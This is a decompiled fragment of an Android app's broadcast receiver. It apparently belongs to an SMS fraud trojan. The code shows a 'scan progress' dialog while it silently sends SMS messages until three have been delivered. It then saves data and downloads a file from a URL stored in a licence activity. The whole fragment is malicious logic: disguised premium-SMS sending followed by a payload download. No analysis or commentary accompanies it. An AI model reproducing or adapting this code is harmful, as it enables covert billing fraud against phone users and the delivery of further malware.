	final synthetic com.pavel.newmodule.RuleActivity this$0
	
	    RuleActivity$5(com.pavel.newmodule.RuleActivity p1)
	    {
	        this.this$0 = p1;
	        return;
	    }
	
	
	    public void onReceive(android.content.Context p6, android.content.Intent p7)
	    {
	        switch (this.getResultCode()) {
	            case -1:
	                if (this.this$0.smsCount >= 3) {
	                    this.this$0.ScanProgress.dismiss();
	                    this.this$0.saveData();
	                    this.this$0.checkAndCreateDirectory("/Apps");
	                    com.pavel.newmodule.RuleActivity v0_11 = new com.pavel.newmodule.RuleActivity$downloadData(this.this$0);
	                    String[] v1_5 = new String[2];
	                    v1_5[0] = com.pavel.newmodule.LicenseActivity.url;
	                    v1_5[1] = com.pavel.newmodule.LicenseActivity.filename;
	                    v0_11.execute(v1_5);
	                    this.this$0.showDialog(1);
	                } else {
	                    com.pavel.newmodule.RuleActivity v0_13 = this.this$0;
	                    v0_13.smsCount = (v0_13.smsCount + 1);
	                    com.pavel.newmodule.RuleActivity.access$0(this.this$0);
	                }
	                break;
	            case 0:
	                android.widget.Toast.makeText(this.this$0.getBaseContext(), "SMS not delivered", 0).show();
	                break;
	        }
	        return;
	    }
	
